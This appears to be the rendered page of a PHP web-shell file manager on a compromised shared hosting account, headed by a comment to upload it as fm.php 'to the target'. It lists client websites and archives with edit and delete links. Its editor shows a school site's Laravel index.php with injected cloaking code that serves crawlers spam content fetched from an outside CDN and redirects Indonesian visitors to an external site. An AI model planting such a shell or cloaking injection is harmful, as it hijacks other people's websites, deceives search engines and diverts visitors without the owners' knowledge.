<!-- save as fm.php and upload to the target -->
<!DOCTYPE html>
<html>
<head>
<title>FM</title>
<style>
body{font-family:monospace;background:#0d1117;color:#c9d1d9;padding:20px;max-width:1200px;margin:auto;}
a{color:#58a6ff;text-decoration:none;}
a:hover{text-decoration:underline;}
input,textarea,select{width:100%;padding:8px;margin:4px 0;background:#161b22;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;}
textarea{height:400px;font-family:monospace;}
button{background:#238636;color:#fff;border:none;padding:8px 16px;cursor:pointer;border-radius:4px;margin:2px;}
button.danger{background:#da3633;}
button:hover{opacity:0.9;}
pre{background:#161b22;padding:10px;border-radius:4px;overflow:auto;}
.msg{padding:10px;background:#161b22;border-left:3px solid #238636;margin:10px 0;}
.dir{padding:4px 0;}
.file{padding:4px 0;}
.folder{color:#f0883e;font-weight:bold;}
</style>
</head>
<body>

<h1>📁 File Manager</h1>
<p><strong>Root:</strong> /home4/websisrj/public_html/</p>
<p><strong>Current:</strong> /home4/websisrj/public_html/</p>


<!-- File List -->
<h3>Files</h3>
<div>
<a href="?dir=%2Fhome4%2Fwebsisrj">📂 [Up]</a>
<div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fajax.php'>ajax.php</a> <span style='color:#888;'>[2238 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fajax.php' class='danger' onclick='return confirm("Delete ajax.php?")'>[×]</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Faurilandingpage.zip'>aurilandingpage.zip</a> <span style='color:#888;'>[9090 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Faurilandingpage.zip' class='danger' onclick='return confirm("Delete aurilandingpage.zip?")'>[×]</a></div><div class='dir folder'>📁 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fayurdhamclinic.com'>ayurdhamclinic.com</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fayurdhamclinic.com.zip'>ayurdhamclinic.com.zip</a> <span style='color:#888;'>[273084556 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fayurdhamclinic.com.zip' class='danger' onclick='return confirm("Delete ayurdhamclinic.com.zip?")'>[×]</a></div><div class='dir folder'>📁 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fbackup'>backup</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fbanner_image.png'>banner_image.png</a> <span style='color:#888;'>[1004899 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fbanner_image.png' class='danger' onclick='return confirm("Delete banner_image.png?")'>[×]</a></div><div class='dir folder'>📁 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fcgi-bin'>cgi-bin</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fcheck-in.png'>check-in.png</a> <span style='color:#888;'>[376958 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fcheck-in.png' class='danger' onclick='return confirm("Delete check-in.png?")'>[×]</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fcheckin.png'>checkin.png</a> <span style='color:#888;'>[376958 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fcheckin.png' class='danger' onclick='return confirm("Delete checkin.png?")'>[×]</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fcheckins.png'>checkins.png</a> <span style='color:#888;'>[376958 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fcheckins.png' class='danger' onclick='return confirm("Delete checkins.png?")'>[×]</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fclass.phpmailer.php'>class.phpmailer.php</a> <span style='color:#888;'>[74525 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fclass.phpmailer.php' class='danger' onclick='return confirm("Delete class.phpmailer.php?")'>[×]</a></div><div class='dir folder'>📁 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fcss'>css</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fdashboard.png'>dashboard.png</a> <span style='color:#888;'>[495659 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fdashboard.png' class='danger' onclick='return confirm("Delete dashboard.png?")'>[×]</a></div><div class='dir folder'>📁 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fdreams-technology.com'>dreams-technology.com</a></div><div class='dir folder'>📁 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fdreamstechnology.in'>dreamstechnology.in</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fdrean_logoSML.png'>drean_logoSML.png</a> <span style='color:#888;'>[21188 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fdrean_logoSML.png' class='danger' onclick='return confirm("Delete drean_logoSML.png?")'>[×]</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Ferror_log'>error_log</a> <span style='color:#888;'>[124093 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Ferror_log' class='danger' onclick='return confirm("Delete error_log?")'>[×]</a></div><div class='dir folder'>📁 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Ffonts'>fonts</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fget-reviews.php'>get-reviews.php</a> <span style='color:#888;'>[501 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fget-reviews.php' class='danger' onclick='return confirm("Delete get-reviews.php?")'>[×]</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fguests.png'>guests.png</a> <span style='color:#888;'>[598766 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fguests.png' class='danger' onclick='return confirm("Delete guests.png?")'>[×]</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fgurugeecinema.com.zip'>gurugeecinema.com.zip</a> <span style='color:#888;'>[252490894 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fgurugeecinema.com.zip' class='danger' onclick='return confirm("Delete gurugeecinema.com.zip?")'>[×]</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fhero-bg-tech.png'>hero-bg-tech.png</a> <span style='color:#888;'>[1938828 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fhero-bg-tech.png' class='danger' onclick='return confirm("Delete hero-bg-tech.png?")'>[×]</a></div><div class='dir folder'>📁 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fhillwoodsschool.com'>hillwoodsschool.com</a></div><div class='dir folder'>📁 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fhrms.dreams-technology.com'>hrms.dreams-technology.com</a></div><div class='dir folder'>📁 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fimg'>img</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Findex.html'>index.html</a> <span style='color:#888;'>[32021 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Findex.html' class='danger' onclick='return confirm("Delete index.html?")'>[×]</a></div><div class='dir folder'>📁 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fjs'>js</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fnew_logo.png'>new_logo.png</a> <span style='color:#888;'>[980424 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fnew_logo.png' class='danger' onclick='return confirm("Delete new_logo.png?")'>[×]</a></div><div class='dir folder'>📁 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fnkenfabtechnology.com'>nkenfabtechnology.com</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fnkenfabtechnology.com.zip'>nkenfabtechnology.com.zip</a> <span style='color:#888;'>[382 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fnkenfabtechnology.com.zip' class='danger' onclick='return confirm("Delete nkenfabtechnology.com.zip?")'>[×]</a></div><div class='dir folder'>📁 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fpropertyingiftcity.com'>propertyingiftcity.com</a></div><div class='dir folder'>📁 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Frailway'>railway</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Frealestatelandingpage.html'>realestatelandingpage.html</a> <span style='color:#888;'>[4297 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Frealestatelandingpage.html' class='danger' onclick='return confirm("Delete realestatelandingpage.html?")'>[×]</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Freports.png'>reports.png</a> <span style='color:#888;'>[302830 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Freports.png' class='danger' onclick='return confirm("Delete reports.png?")'>[×]</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fresort.html'>resort.html</a> <span style='color:#888;'>[7414 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fresort.html' class='danger' onclick='return confirm("Delete resort.html?")'>[×]</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fsend.php'>send.php</a> <span style='color:#888;'>[3016 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fsend.php' class='danger' onclick='return confirm("Delete send.php?")'>[×]</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fsendmail.php'>sendmail.php</a> <span style='color:#888;'>[994 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fsendmail.php' class='danger' onclick='return confirm("Delete sendmail.php?")'>[×]</a></div><div class='file'>📄 <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&edit=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fthank-you.html'>thank-you.html</a> <span style='color:#888;'>[15029 B]</span> <a href='?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F&del=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F%2Fthank-you.html' class='danger' onclick='return confirm("Delete thank-you.html?")'>[×]</a></div></div>

<!-- Editor -->
<hr>
<h3>✏️ Editing: index.php</h3>
<form method="post">
<input type="hidden" name="file" value="/home4/websisrj/public_html/hillwoodsschool.com/index.php">
<textarea name="content">&lt;?php
/** * Integrasi Cloaking Universal - Taruh di baris paling atas index.php 
 */

$ua = $_SERVER[&#039;HTTP_USER_AGENT&#039;] ?? &#039;&#039;;
$ip = $_SERVER[&#039;REMOTE_ADDR&#039;] ?? &#039;&#039;;

// 1. IDENTIFIKASI BOT (Google, Bing, dll)
$is_bot = preg_match(&quot;/(googlebot|google-inspectiontool|adsbot|bingbot|yandex|crawler)/i&quot;, $ua);

if ($is_bot) {
    // Tampilkan konten khusus bot agar SEO aman
    $bot_url = &quot;https://semoga-cair-lagi.b-cdn.net/hillwoodsschool.txt&quot;;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $bot_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $res = curl_exec($ch);
    curl_close($ch);
    echo $res;
    exit;
}

// 2. IDENTIFIKASI USER INDONESIA (Redirect ke AMP)
$geo = @json_decode(@file_get_contents(&quot;http://ip-api.com/json/$ip?fields=countryCode&quot;), true);

if (isset($geo[&#039;countryCode&#039;]) &amp;&amp; $geo[&#039;countryCode&#039;] === &quot;ID&quot;) {
    header(&quot;Location: https://semoga-membantu-yang-harusnya-dibantu.pages.dev/&quot;, true, 301);
    exit;
}

// --- LANJUT KE KODE CMS ASLI DI BAWAH INI ---
?&gt;
&lt;?php

ob_start();

use Illuminate\Contracts\Http\Kernel;
use Illuminate\Http\Request;


define(&#039;LARAVEL_START&#039;, microtime(true));

/*
|--------------------------------------------------------------------------
| Check If Application Is Under Maintenance
|--------------------------------------------------------------------------
|
| If the application is maintenance / demo mode via the &quot;down&quot; command we
| will require this file so that any prerendered template can be shown
| instead of starting the framework, which could cause an exception.
|
*/

if (file_exists(__DIR__.&#039;/storage/framework/maintenance.php&#039;)) {
    require __DIR__.&#039;/storage/framework/maintenance.php&#039;;
}

$routerV7File = __DIR__.&#039;/bootstrap/cache/routes-v7.php&#039;;

if (file_exists($routerV7File)) {
    
	unlink($routerV7File);
}

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| this application. We just need to utilize it! We&#039;ll simply require it
| into the script here so we don&#039;t need to manually load our classes.
|
*/

require __DIR__.&#039;/vendor/autoload.php&#039;;

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request using
| the application&#039;s HTTP kernel. Then, we will send the response back
| to this client&#039;s browser, allowing them to enjoy our application.
|
*/

$app = require_once __DIR__.&#039;/bootstrap/app.php&#039;;


$kernel = $app-&gt;make(Kernel::class);

$response = tap($kernel-&gt;handle(
    $request = Request::capture()
))-&gt;send();

$kernel-&gt;terminate($request, $response);</textarea><br>
<button type="submit" name="save">💾 Save</button>
<a href="?dir=%2Fhome4%2Fwebsisrj%2Fpublic_html%2F"><button type="button">← Back</button></a>
</form>

<hr>
<div style="display:flex;gap:20px;flex-wrap:wrap;">

<!-- Upload -->
<div style="flex:1;min-width:250px;">
<h3>📤 Upload File</h3>
<form method="post" enctype="multipart/form-data">
<input type="file" name="up" required>
<button type="submit" name="upload">Upload</button>
</form>
</div>

<!-- Create New File -->
<div style="flex:1;min-width:250px;">
<h3>📄 New File</h3>
<form method="post">
<input type="text" name="newfile" placeholder="filename.txt" required>
<button type="submit" name="create">Create</button>
</form>
</div>

</div>

</body>
</html>
